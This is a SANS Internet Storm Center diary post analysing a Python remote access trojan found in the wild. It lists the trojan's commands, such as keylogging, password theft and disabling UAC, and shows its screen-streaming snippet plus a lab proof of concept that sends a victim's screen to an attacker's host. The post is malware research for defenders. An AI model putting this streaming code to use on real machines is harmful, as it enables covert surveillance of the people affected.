---
title: Python RAT with a Nice Screensharing Feature, (Tue, Nov 5th)
url: https://isc.sans.edu/diary/rss/31414
source: SANS Internet Storm Center, InfoCON: green
date: 2024-11-06
fetch_date: 2025-10-06T19:20:19.955024
---

# Python RAT with a Nice Screensharing Feature, (Tue, Nov 5th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31408)
* [next](/diary/31420)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Python RAT with a Nice Screensharing Feature](/forums/diary/Python%2BRAT%2Bwith%2Ba%2BNice%2BScreensharing%2BFeature/31414/)

**Published**: 2024-11-05. **Last Updated**: 2024-11-05 08:10:24 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Python%2BRAT%2Bwith%2Ba%2BNice%2BScreensharing%2BFeature/31414/#comments)

While hunting, I found another interesting Python RAT in the wild. This is not brand new because the script was released two years ago[[1](https://github.com/FZGbzuw412/Python-RAT/tree/main)]. The script I found is based on the same tool and still has a low VT score: 3/64 (SHA256:1281b7184278f2a4814b245b48256da32a6348b317b83c440008849a16682ccb)[[2](https://www.virustotal.com/gui/file/1281b7184278f2a4814b245b48256da32a6348b317b83c440008849a16682ccb)]. The RAT has a lot of features to control the victim's computer:

```

remnux@remnux:/MalwareZoo/20241021$ egrep "command ==" client.pyw
            if command == 'shell':
                    if command == 'cd':
            elif command == 'screenshare':
            elif command == 'webcam':
            elif command == 'breakstream':
            elif command == 'list':
            elif command == 'geolocate':
            elif command == 'setvalue':
            elif command == 'delkey':
            elif command == 'createkey':
            elif command == 'volumeup':
            elif command == 'volumedown':
            elif command == 'setwallpaper':
            elif command == 'usbdrivers':
            elif command == 'monitors':
            elif command == 'sysinfo':
            elif command == 'reboot':
            elif command == 'pwd':
            elif command == 'ipconfig':
            elif command == 'portscan':
            elif command == 'tasklist':
            elif command == 'profiles':
            elif command == 'profilepswd':
            elif command == 'systeminfo':
            elif command == 'sendmessage':
            elif command == 'disableUAC':
            elif command == 'turnoffmon':
            elif command == 'turnonmon':
            elif command == 'extendrights':
            elif command == 'isuseradmin':
            elif command == 'keyscan_start':
            elif command == 'send_logs':
            elif command == 'stop_keylogger':
            elif command == 'cpu_cores':
            elif command == 'cd ..':
            elif command == 'dir':
            elif command == 'curpid':
            elif command == 'drivers':
            elif command == 'shutdown':
            elif command == 'disabletaskmgr':
            elif command == 'enabletaskmgr':
            elif command == 'localtime':
            elif command == 'upload':
            elif command == 'browser':
            elif command == 'screenshot':
            elif command == 'webcam_snap':
            elif command == 'exit':
            elif command == "PASSWORDS":
```

Taking screenshots is a classic feature but one of the commands attracted my attention: "screenshare". Let's have a closer look at this one:

```

try:
    from vidstream import ScreenShareClient
    screen = ScreenShareClient(self.host, 8080)
    screen.start_stream()
except:
    s.send("Impossible to get screen")
```

The magic feature is provided by the "vidstream" Python library. This library has not been updated for a few years but still does a great job. I made a quick proof-of-concept to demonstrate this nice capability of the RAT:

Let's run a server on the attacker's computer:

```

import time
from vidstream import StreamingServer
server = StreamingServer('192.168.131.205', 9999)
server.start_server()
print("Waiting for victim...")
while True:
    time.sleep(10)
# When You Are Done
server.stop_server()
```

On the victim's computer, let's run the following code:

```

from vidstream import CameraClient
from vidstream import VideoClient
from vidstream import ScreenShareClient
client1 = ScreenShareClient('192.168.131.202', 9999)
client1.start_stream()
```

In the screenshot below, the victim's VM is on the left (Windows 11), and the attacker's VM is on the right (REMnux):

![](https://isc.sans.edu/diaryimages/images/isc-20241105-1.png)

Once the client is connected to the server, a window opens with a copy of the victim's screen. I recorded a short video when playing with the desktop[[4](https://youtu.be/FrUs7gUMLTs)]:

 Another good proof of why Python became a popular language for attackers, even for Windows environments!

[1] <https://github.com/FZGbzuw412/Python-RAT/tree/main>
[2] <https://www.virustotal.com/gui/file/1281b7184278f2a4814b245b48256da32a6348b317b83c440008849a16682ccb>
[3] <https://pypi.org/project/vidstream/>
[4] <https://youtu.be/FrUs7gUMLTs>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Malware](/tag.html?tag=Malware) [Python](/tag.html?tag=Python) [RAT](/tag.html?tag=RAT) [Screen](/tag.html?tag=Screen) [Screenshare](/tag.html?tag=Screenshare)

[0 comment(s)](/diary/Python%2BRAT%2Bwith%2Ba%2BNice%2BScreensharing%2BFeature/31414/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31408)
* [next](/diary/31420)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)